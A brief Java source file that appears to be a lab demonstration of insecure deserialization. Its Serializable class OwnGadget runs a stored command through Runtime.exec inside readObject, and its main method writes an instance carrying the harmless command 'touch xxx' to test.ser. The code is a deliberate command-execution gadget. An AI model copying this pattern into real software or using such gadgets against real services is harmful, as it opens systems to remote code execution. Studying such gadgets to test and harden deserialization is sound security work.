package target.classes;

import java.io.*;

public class OwnGadget implements Serializable {
    private String cmd;

    public OwnGadget(String cmd) {
        this.cmd = cmd;
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(cmd);
    }

    public static void main(String[] args) throws IOException {

        FileWriter fileWriter = new FileWriter("test.ser");
        PrintWriter printWriter = new PrintWriter(fileWriter);

        OwnGadget own = new OwnGadget("touch xxx");

        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("test.ser"))) {
            oos.writeObject(own);
        }

        printWriter.close();

    }
}
